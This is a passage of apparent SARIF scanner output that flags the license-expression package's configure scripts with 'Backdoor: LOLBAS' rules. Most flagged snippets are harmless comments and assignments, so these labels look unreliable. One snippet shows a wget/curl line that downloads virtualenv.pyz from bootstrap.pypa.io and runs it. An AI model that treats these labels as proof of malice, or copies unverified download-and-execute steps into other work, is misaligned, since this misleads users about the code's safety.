            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 35,
                  "endLine": 48,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\r\n\r\n@rem ################################\r\n@rem # Current directory where this script lives\r\nset CFG_ROOT_DIR=%~dp0\r\nset \"CFG_BIN_DIR=%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\Scripts\"\r\n\r\n",
                    "rendered": {
                      "text": "\r\n\r\n@rem ################################\r\n@rem # Current directory where this script lives\r\nset CFG_ROOT_DIR=%~dp0\r\nset \"CFG_BIN_DIR=%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\Scripts\"\r\n\r\n",
                      "markdown": "`\r\n\r\n@rem ################################\r\n@rem # Current directory where this script lives\r\nset CFG_ROOT_DIR=%~dp0\r\nset \"CFG_BIN_DIR=%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\Scripts\"\r\n\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 33,
                  "endLine": 39,
                  "endColumn": 38,
                  "snippet": {
                    "text": "@rem # Cleanable files and directories to delete with the --clean option\r\nset \"CLEANABLE=build dist venv .cache .eggs\"\r\n\r\n@rem # extra  arguments passed to pip\r\nset \"PIP_EXTRA_ARGS= \"\r\n\r\n@rem # the URL to download virtualenv.pyz if needed\r\n",
                    "rendered": {
                      "text": "@rem # Cleanable files and directories to delete with the --clean option\r\nset \"CLEANABLE=build dist venv .cache .eggs\"\r\n\r\n@rem # extra  arguments passed to pip\r\nset \"PIP_EXTRA_ARGS= \"\r\n\r\n@rem # the URL to download virtualenv.pyz if needed\r\n",
                      "markdown": "`@rem # Cleanable files and directories to delete with the --clean option\r\nset \"CLEANABLE=build dist venv .cache .eggs\"\r\n\r\n@rem # extra  arguments passed to pip\r\nset \"PIP_EXTRA_ARGS= \"\r\n\r\n@rem # the URL to download virtualenv.pyz if needed\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 38,
                  "endLine": 28,
                  "endColumn": 43,
                  "snippet": {
                    "text": "@rem # Defaults. Change these variables to customize this script\r\n@rem ################################\r\n\r\n@rem # Requirement arguments passed to pip and used by default or with --dev.\r\nset \"REQUIREMENTS=--editable . --constraint requirements.txt\"\r\nset \"DEV_REQUIREMENTS=--editable .[testing] --constraint requirements.txt --constraint requirements-dev.txt\"\r\nset \"DOCS_REQUIREMENTS=--editable .[docs] --constraint requirements.txt\"\r\n",
                    "rendered": {
                      "text": "@rem # Defaults. Change these variables to customize this script\r\n@rem ################################\r\n\r\n@rem # Requirement arguments passed to pip and used by default or with --dev.\r\nset \"REQUIREMENTS=--editable . --constraint requirements.txt\"\r\nset \"DEV_REQUIREMENTS=--editable .[testing] --constraint requirements.txt --constraint requirements-dev.txt\"\r\nset \"DOCS_REQUIREMENTS=--editable .[docs] --constraint requirements.txt\"\r\n",
                      "markdown": "`@rem # Defaults. Change these variables to customize this script\r\n@rem ################################\r\n\r\n@rem # Requirement arguments passed to pip and used by default or with --dev.\r\nset \"REQUIREMENTS=--editable . --constraint requirements.txt\"\r\nset \"DEV_REQUIREMENTS=--editable .[testing] --constraint requirements.txt --constraint requirements-dev.txt\"\r\nset \"DOCS_REQUIREMENTS=--editable .[docs] --constraint requirements.txt\"\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 57,
                  "endLine": 25,
                  "endColumn": 65,
                  "snippet": {
                    "text": "\r\n\r\n@rem ################################\r\n@rem # Defaults. Change these variables to customize this script\r\n@rem ################################\r\n\r\n@rem # Requirement arguments passed to pip and used by default or with --dev.\r\n",
                    "rendered": {
                      "text": "\r\n\r\n@rem ################################\r\n@rem # Defaults. Change these variables to customize this script\r\n@rem ################################\r\n\r\n@rem # Requirement arguments passed to pip and used by default or with --dev.\r\n",
                      "markdown": "`\r\n\r\n@rem ################################\r\n@rem # Defaults. Change these variables to customize this script\r\n@rem ################################\r\n\r\n@rem # Requirement arguments passed to pip and used by default or with --dev.\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 11,
                  "endLine": 19,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\r\n@rem # NOTE: please keep in sync with POSIX script configure\r\n\r\n@rem # This script will search for a virtualenv.pyz app in etc\\thirdparty\\virtualenv.pyz\r\n@rem # Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\r\n@rem ################################\r\n\r\n",
                    "rendered": {
                      "text": "\r\n@rem # NOTE: please keep in sync with POSIX script configure\r\n\r\n@rem # This script will search for a virtualenv.pyz app in etc\\thirdparty\\virtualenv.pyz\r\n@rem # Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\r\n@rem ################################\r\n\r\n",
                      "markdown": "`\r\n@rem # NOTE: please keep in sync with POSIX script configure\r\n\r\n@rem # This script will search for a virtualenv.pyz app in etc\\thirdparty\\virtualenv.pyz\r\n@rem # Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\r\n@rem ################################\r\n\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 43,
                  "endLine": 17,
                  "endColumn": 51,
                  "snippet": {
                    "text": "@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n\r\n@rem # NOTE: please keep in sync with POSIX script configure\r\n\r\n@rem # This script will search for a virtualenv.pyz app in etc\\thirdparty\\virtualenv.pyz\r\n@rem # Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\r\n",
                    "rendered": {
                      "text": "@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n\r\n@rem # NOTE: please keep in sync with POSIX script configure\r\n\r\n@rem # This script will search for a virtualenv.pyz app in etc\\thirdparty\\virtualenv.pyz\r\n@rem # Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\r\n",
                      "markdown": "`@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n\r\n@rem # NOTE: please keep in sync with POSIX script configure\r\n\r\n@rem # This script will search for a virtualenv.pyz app in etc\\thirdparty\\virtualenv.pyz\r\n@rem # Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 18,
                  "endLine": 14,
                  "endColumn": 26,
                  "snippet": {
                    "text": "@rem ################################\r\n@rem # A configuration script to set things up:\r\n@rem # create a virtualenv and install or update thirdparty packages.\r\n@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n\r\n@rem # NOTE: please keep in sync with POSIX script configure\r\n",
                    "rendered": {
                      "text": "@rem ################################\r\n@rem # A configuration script to set things up:\r\n@rem # create a virtualenv and install or update thirdparty packages.\r\n@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n\r\n@rem # NOTE: please keep in sync with POSIX script configure\r\n",
                      "markdown": "`@rem ################################\r\n@rem # A configuration script to set things up:\r\n@rem # create a virtualenv and install or update thirdparty packages.\r\n@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n\r\n@rem # NOTE: please keep in sync with POSIX script configure\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 22,
                  "endLine": 12,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\r\n\r\n@rem ################################\r\n@rem # A configuration script to set things up:\r\n@rem # create a virtualenv and install or update thirdparty packages.\r\n@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n",
                    "rendered": {
                      "text": "\r\n\r\n@rem ################################\r\n@rem # A configuration script to set things up:\r\n@rem # create a virtualenv and install or update thirdparty packages.\r\n@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n",
                      "markdown": "`\r\n\r\n@rem ################################\r\n@rem # A configuration script to set things up:\r\n@rem # create a virtualenv and install or update thirdparty packages.\r\n@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 36,
                  "endLine": 15,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\n################################\n# A configuration script to set things up:\n# create a virtualenv and install or update thirdparty packages.\n# Source this script for initial configuration\n# Use configure --help for details\n#\n",
                    "rendered": {
                      "text": "\n################################\n# A configuration script to set things up:\n# create a virtualenv and install or update thirdparty packages.\n# Source this script for initial configuration\n# Use configure --help for details\n#\n",
                      "markdown": "`\n################################\n# A configuration script to set things up:\n# create a virtualenv and install or update thirdparty packages.\n# Source this script for initial configuration\n# Use configure --help for details\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env bash\n#\n# Copyright (c) nexB Inc. and others. All rights reserved.\n# SPDX-License-Identifier: Apache-2.0\n# See http://www.apache.org/licenses/LICENSE-2.0 for the license text.\n",
                    "rendered": {
                      "text": "#!/usr/bin/env bash\n#\n# Copyright (c) nexB Inc. and others. All rights reserved.\n# SPDX-License-Identifier: Apache-2.0\n# See http://www.apache.org/licenses/LICENSE-2.0 for the license text.\n",
                      "markdown": "`#!/usr/bin/env bash\n#\n# Copyright (c) nexB Inc. and others. All rights reserved.\n# SPDX-License-Identifier: Apache-2.0\n# See http://www.apache.org/licenses/LICENSE-2.0 for the license text.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 33,
                  "endLine": 145,
                  "snippet": {
                    "text": "\n################################\ncli_help() {\n    echo An initial configuration script\n    echo \"  usage: ./configure [options]\"\n    echo\n    echo The default is to configure for regular use. Use --dev for development.\n    echo\n",
                    "rendered": {
                      "text": "\n################################\ncli_help() {\n    echo An initial configuration script\n    echo \"  usage: ./configure [options]\"\n    echo\n    echo The default is to configure for regular use. Use --dev for development.\n    echo\n",
                      "markdown": "`\n################################\ncli_help() {\n    echo An initial configuration script\n    echo \"  usage: ./configure [options]\"\n    echo\n    echo The default is to configure for regular use. Use --dev for development.\n    echo\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 29,
                  "endLine": 129,
                  "endColumn": 35,
                  "snippet": {
                    "text": "install_packages() {\n    # install requirements in virtualenv\n    # note: --no-build-isolation means that pip/wheel/setuptools will not\n    # be reinstalled a second time and reused from the virtualenv and this\n    # speeds up the installation.\n    # We always have the PEP517 build dependencies installed already.\n\n",
                    "rendered": {
                      "text": "install_packages() {\n    # install requirements in virtualenv\n    # note: --no-build-isolation means that pip/wheel/setuptools will not\n    # be reinstalled a second time and reused from the virtualenv and this\n    # speeds up the installation.\n    # We always have the PEP517 build dependencies installed already.\n\n",
                      "markdown": "`install_packages() {\n    # install requirements in virtualenv\n    # note: --no-build-isolation means that pip/wheel/setuptools will not\n    # be reinstalled a second time and reused from the virtualenv and this\n    # speeds up the installation.\n    # We always have the PEP517 build dependencies installed already.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 20,
                  "endLine": 115,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n            --wheel embed --pip embed --setuptools embed \\\n            --seeder pip \\\n            --never-download \\\n            --no-periodic-update \\\n            --no-vcs-ignore \\\n",
                    "rendered": {
                      "text": "\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n            --wheel embed --pip embed --setuptools embed \\\n            --seeder pip \\\n            --never-download \\\n            --no-periodic-update \\\n            --no-vcs-ignore \\\n",
                      "markdown": "`\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n            --wheel embed --pip embed --setuptools embed \\\n            --seeder pip \\\n            --never-download \\\n            --no-periodic-update \\\n            --no-vcs-ignore \\\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 74,
                  "endLine": 110,
                  "endColumn": 80,
                  "snippet": {
                    "text": "            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/etc/thirdparty/virtualenv.pyz\"\n        else\n            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/$VENV_DIR/virtualenv.pyz\"\n            wget -O \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\" 2>/dev/null || curl -o  \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\"\n        fi\n\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n",
                    "rendered": {
                      "text": "            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/etc/thirdparty/virtualenv.pyz\"\n        else\n            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/$VENV_DIR/virtualenv.pyz\"\n            wget -O \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\" 2>/dev/null || curl -o  \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\"\n        fi\n\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n",
                      "markdown": "`            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/etc/thirdparty/virtualenv.pyz\"\n        else\n            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/$VENV_DIR/virtualenv.pyz\"\n            wget -O \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\" 2>/dev/null || curl -o  \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\"\n        fi\n\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 11,
                  "endLine": 110,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/etc/thirdparty/virtualenv.pyz\"\n        else\n            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/$VENV_DIR/virtualenv.pyz\"\n            wget -O \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\" 2>/dev/null || curl -o  \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\"\n        fi\n\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n",
                    "rendered": {
                      "text": "            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/etc/thirdparty/virtualenv.pyz\"\n        else\n            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/$VENV_DIR/virtualenv.pyz\"\n            wget -O \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\" 2>/dev/null || curl -o  \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\"\n        fi\n\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n",
                      "markdown": "`            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/etc/thirdparty/virtualenv.pyz\"\n        else\n            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/$VENV_DIR/virtualenv.pyz\"\n            wget -O \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\" 2>/dev/null || curl -o  \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\"\n        fi\n\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 66,
                  "endLine": 98,
                  "endColumn": 71,
                  "snippet": {
                    "text": "create_virtualenv() {\n    # create a virtualenv for Python\n    # Note: we do not use the bundled Python 3 \"venv\" because its behavior and\n    # presence is not consistent across Linux distro and sometimes pip is not\n    # included either by default. The virtualenv.pyz app cures all these issues.\n\n    VENV_DIR=\"$1\"\n",
                    "rendered": {
                      "text": "create_virtualenv() {\n    # create a virtualenv for Python\n    # Note: we do not use the bundled Python 3 \"venv\" because its behavior and\n    # presence is not consistent across Linux distro and sometimes pip is not\n    # included either by default. The virtualenv.pyz app cures all these issues.\n\n    VENV_DIR=\"$1\"\n",
                      "markdown": "`create_virtualenv() {\n    # create a virtualenv for Python\n    # Note: we do not use the bundled Python 3 \"venv\" because its behavior and\n    # presence is not consistent across Linux distro and sometimes pip is not\n    # included either by default. The virtualenv.pyz app cures all these issues.\n\n    VENV_DIR=\"$1\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 1,
                  "endLine": 79,
                  "endColumn": 7,
                  "snippet": {
                    "text": "\n\n################################\n# Find a proper Python to run\n# Use environment variables or a file if available.\n# Otherwise the latest Python by default.\nfind_python() {\n",
                    "rendered": {
                      "text": "\n\n################################\n# Find a proper Python to run\n# Use environment variables or a file if available.\n# Otherwise the latest Python by default.\nfind_python() {\n",
                      "markdown": "`\n\n################################\n# Find a proper Python to run\n# Use environment variables or a file if available.\n# Otherwise the latest Python by default.\nfind_python() {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 1,
                  "endLine": 64,
                  "endColumn": 7,
                  "snippet": {
                    "text": "\n################################\n# Thirdparty package locations and index handling\n# Find packages from the local thirdparty directory if present\nTHIRDPARDIR=$CFG_ROOT_DIR/thirdparty\nif [[ \"$(echo $THIRDPARDIR/*.whl)x\" != \"$THIRDPARDIR/*.whlx\" ]]; then\n    PIP_EXTRA_ARGS=\"$NO_INDEX --find-links $THIRDPARDIR\"\n",
                    "rendered": {
                      "text": "\n################################\n# Thirdparty package locations and index handling\n# Find packages from the local thirdparty directory if present\nTHIRDPARDIR=$CFG_ROOT_DIR/thirdparty\nif [[ \"$(echo $THIRDPARDIR/*.whl)x\" != \"$THIRDPARDIR/*.whlx\" ]]; then\n    PIP_EXTRA_ARGS=\"$NO_INDEX --find-links $THIRDPARDIR\"\n",
                      "markdown": "`\n################################\n# Thirdparty package locations and index handling\n# Find packages from the local thirdparty directory if present\nTHIRDPARDIR=$CFG_ROOT_DIR/thirdparty\nif [[ \"$(echo $THIRDPARDIR/*.whl)x\" != \"$THIRDPARDIR/*.whlx\" ]]; then\n    PIP_EXTRA_ARGS=\"$NO_INDEX --find-links $THIRDPARDIR\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 30,
                  "endLine": 50,
                  "endColumn": 38,
                  "snippet": {
                    "text": "\n\n################################\n# Current directory where this script lives\nCFG_ROOT_DIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\"\nCFG_BIN_DIR=$CFG_ROOT_DIR/$VIRTUALENV_DIR/bin\n\n",
                    "rendered": {
                      "text": "\n\n################################\n# Current directory where this script lives\nCFG_ROOT_DIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\"\nCFG_BIN_DIR=$CFG_ROOT_DIR/$VIRTUALENV_DIR/bin\n\n",
                      "markdown": "`\n\n################################\n# Current directory where this script lives\nCFG_ROOT_DIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\"\nCFG_BIN_DIR=$CFG_ROOT_DIR/$VIRTUALENV_DIR/bin\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 28,
                  "endLine": 42,
                  "snippet": {
                    "text": "# Cleanable files and directories to delete with the --clean option\nCLEANABLE=\"build dist venv .cache .eggs\"\n\n# extra  arguments passed to pip\nPIP_EXTRA_ARGS=\" \"\n\n# the URL to download virtualenv.pyz if needed\nVIRTUALENV_PYZ_URL=https://bootstrap.pypa.io/virtualenv.pyz\n",
                    "rendered": {
                      "text": "# Cleanable files and directories to delete with the --clean option\nCLEANABLE=\"build dist venv .cache .eggs\"\n\n# extra  arguments passed to pip\nPIP_EXTRA_ARGS=\" \"\n\n# the URL to download virtualenv.pyz if needed\nVIRTUALENV_PYZ_URL=https://bootstrap.pypa.io/virtualenv.pyz\n",
                      "markdown": "`# Cleanable files and directories to delete with the --clean option\nCLEANABLE=\"build dist venv .cache .eggs\"\n\n# extra  arguments passed to pip\nPIP_EXTRA_ARGS=\" \"\n\n# the URL to download virtualenv.pyz if needed\nVIRTUALENV_PYZ_URL=https://bootstrap.pypa.io/virtualenv.pyz\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 33,
                  "endLine": 30,
                  "endColumn": 38,
                  "snippet": {
                    "text": "# Defaults. Change these variables to customize this script\n################################\n\n# Requirement arguments passed to pip and used by default or with --dev.\nREQUIREMENTS=\"--editable . --constraint requirements.txt\"\nDEV_REQUIREMENTS=\"--editable .[testing] --constraint requirements.txt --constraint requirements-dev.txt\"\nDOCS_REQUIREMENTS=\"--editable .[docs] --constraint requirements.txt\"\n",
                    "rendered": {
                      "text": "# Defaults. Change these variables to customize this script\n################################\n\n# Requirement arguments passed to pip and used by default or with --dev.\nREQUIREMENTS=\"--editable . --constraint requirements.txt\"\nDEV_REQUIREMENTS=\"--editable .[testing] --constraint requirements.txt --constraint requirements-dev.txt\"\nDOCS_REQUIREMENTS=\"--editable .[docs] --constraint requirements.txt\"\n",
